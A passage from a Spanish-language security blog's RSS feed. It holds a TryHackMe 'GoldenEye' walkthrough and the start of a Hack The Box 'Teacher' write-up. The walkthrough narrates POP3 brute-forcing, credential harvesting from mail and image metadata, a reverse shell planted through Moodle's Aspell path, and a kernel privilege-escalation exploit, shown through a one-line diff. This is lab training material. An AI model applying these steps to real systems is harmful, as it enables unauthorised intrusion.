  Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
  .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
  
&lt;div id=&#34;34f1b3d1c5e45312&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  RETR &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
  +OK &lt;span class=&#34;m&#34;&gt;1048&lt;/span&gt; octets
  Return-Path: &amp;lt;root@ubuntu&amp;gt;
  X-Original-To: natalya
  Delivered-To: natalya@ubuntu
  Received: from root &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
      by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with SMTP id 17C96454B1
      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;natalya&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 20:19:42 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Message-Id: &amp;lt;20180425031956.17C96454B1@ubuntu&amp;gt;
  Date: Tue, &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 20:19:42 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  From: root@ubuntu

  Ok Natalyn I have a new student &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; you. As this is a new system please &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; me or boris know &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you see any config issues, especially is it&lt;span class=&#34;s1&#34;&gt;&amp;#39;s related to security...even if it&amp;#39;&lt;/span&gt;s not, just enter it in under the guise of &lt;span class=&#34;s2&#34;&gt;&amp;#34;security&amp;#34;&lt;/span&gt;...it&lt;span class=&#34;s1&#34;&gt;&amp;#39;ll get the change order escalated without much hassle :)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Ok, user creds are:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  username: xenia
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  password: [... REDACTED ...]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Boris verified her as a valid contractor so just create the account ok?
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  And if you didn&amp;#39;&lt;/span&gt;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
  **Make sure to edit your host file since you usually work remote off-network....

  Since you&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
  .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;ddf4a8c14cc81176\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;
&lt;h1 id=&#34;goldeneye-part-2&#34;&gt;GOLDENEYE PART 2&lt;/h1&gt;
&lt;p&gt;Agregamos el siguiente dominio &lt;code&gt;severnaya-station.com&lt;/code&gt; a nuestro archiv &lt;code&gt;/etc/hosts&lt;/code&gt; junto a la IP de la maquina, y nos dirigimos a &lt;code&gt;/gnocertdir&lt;/code&gt;. Encontramos lo que parece ser la plataforma &lt;strong&gt;Moodle&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_173213.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales de xenia para ingresar. En los mensajes de xenia encontramos un mensaje de &lt;code&gt;doak&lt;/code&gt; (nuevo nombre de usuario) en donde habla sobre un curso en el que xenia esta involucrada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_173700.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;doak---hydra---pop3&#34;&gt;DOAK - HYDRA -&amp;gt; POP3&lt;/h2&gt;
&lt;p&gt;Nuevamente utilizamos hydra con el usuario &lt;code&gt;doak&lt;/code&gt; en el puerto de pop3 (55007). Logramos obtener su contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_173854.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al revisar uno de sus correos encontramos su usario y contraseña:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;RETR &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+OK &lt;span class=&#34;m&#34;&gt;606&lt;/span&gt; octets
Return-Path: &amp;lt;doak@ubuntu&amp;gt;
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
	by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with SMTP id 97DC24549D
	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;doak&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 20:47:24 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Message-Id: &amp;lt;20180425034731.97DC24549D@ubuntu&amp;gt;
Date: Tue, &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 20:47:24 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
From: doak@ubuntu

James,
If you&lt;span class=&#34;s1&#34;&gt;&amp;#39;re reading this, congrats you&amp;#39;&lt;/span&gt;ve gotten this far. You know how tradecraft works right?

Because I don&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t. Go to our training site and login to my account....dig &lt;span class=&#34;k&#34;&gt;until&lt;/span&gt; you can exfiltrate further information......

username: dr_doak
password: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;admin---moodle&#34;&gt;ADMIN - MOODLE&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales de doak en moodle. Encontramos un archivo que contiene una direccion a una imagen, que segun el mensaje ahi se encuentran las credenciales del usuario &lt;code&gt;admin&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_174321.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Descargamos la imagen y al analizarla con &lt;code&gt;exiftool&lt;/code&gt; encontramos una cadena de texto codificada en base64.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_174531.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la &amp;ldquo;contraseña&amp;rdquo; que encontramos en moodle con el usuario &lt;code&gt;admin&lt;/code&gt; y logramos obtener acceso.&lt;/p&gt;
&lt;h2 id=&#34;www-data---user&#34;&gt;WWW-DATA - USER&lt;/h2&gt;
&lt;p&gt;Dentro de moodle agregamos una shell inversa en la configuracion del PATH de ASPELL.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_175618.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien configuramos el parametro del plugin &lt;code&gt;TinyMCE&lt;/code&gt; a &lt;code&gt;PSpellShell&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_182449.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Pusimos a la escucha netcat, creamos una nueva entrada de blog donde vemos la opcion de &lt;code&gt;spell&lt;/code&gt;, que al presionar el boton, se ejecuta nuestra shell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_182624.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_182726.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;uname -a&lt;/code&gt; y vemos la version del kernel, al revisar si existe un exploit encontramos &lt;a href=&#34;https://www.exploit-db.com/exploits/37292&#34;&gt;&lt;strong&gt;Linux Kernel 3.13.0 - Local Privilege Escalation&lt;/strong&gt;&lt;/a&gt;, el cual descargamos y ejecutamos en la maquina, pero nos dio un error y es que &lt;code&gt;gcc&lt;/code&gt; no está instalado en la maquina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_184638.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Por lo que buscamos alternativas a &lt;code&gt;gcc&lt;/code&gt; y encontramos &lt;code&gt;clang&lt;/code&gt;, el cual si esta instalado en la maquina. Editamos el exploit cambiando gcc por clang, descargamos, ejecutamos el exploit en la maquina y logramos obtener una shell con usuario root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_184813.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gcc&lt;/code&gt; a &lt;code&gt;clang&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;gd&#34;&gt;-lib = system(&amp;#34;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&amp;#34;);
&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+lib = system(&amp;#34;clang -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&amp;#34;);
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_185108.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_185146.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/goldeneye/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/goldeneye/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>pop3</category>
            
          
            
              <category>hydra</category>
            
          
            
              <category>pop3</category>
            
          
            
              <category>moodle</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Teacher</title>
        <link>https://sckull.github.io/posts/teacher/</link>
        <pubDate>Sat, 20 Apr 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 20 Apr 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/teacher/</guid>
        <description>Encontramos credenciales en un fichero y con burpsuite obtuvimos el caracter faltante para acceder a Moodle.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Encontramos credenciales en un fichero y con burpsuite obtuvimos el caracter faltante para acceder a Moodle. Explotamos una vulnerabilidad en Moodle lo que nos dio acceso, y que con credenciales de la base de datos de esta plataforma accedimos a un segundo usuario crackeando los Hashes encontrados.  Obtuvimos la flag root creando un link simbolico.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/165&#34;&gt;Teacher&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.153&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/623&#34;&gt;Gioo&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/623&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.2, 4.9, 6.1, 3.9, 5.1],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[7, 6, 7, 3, 4],
